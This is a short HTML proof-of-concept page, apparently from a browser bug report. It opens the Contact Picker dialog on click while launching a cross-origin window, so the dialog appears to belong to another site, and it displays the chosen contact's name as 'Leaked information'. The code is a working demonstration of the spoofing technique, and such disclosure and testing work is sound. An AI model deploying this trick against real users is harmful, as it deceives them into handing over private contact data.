<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>PoC</title>
    <script>
        document.addEventListener('click', async () => {
            try {
                let contacts = await navigator.contacts.select(["name"], {});
                document.body.innerHTML = `
                    <h1>
                        <font color="red">Leaked information:</font> ${contacts[0].name}
                    </h1>
                `;
            } catch (error) {
                console.error("Error fetching contacts:", error);
            }
            window.open("https://www.google.com", "PoC", "_blank");
        });
    </script>
</head>
<body>
    <center>
        <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
    </center>
</body>
</html>
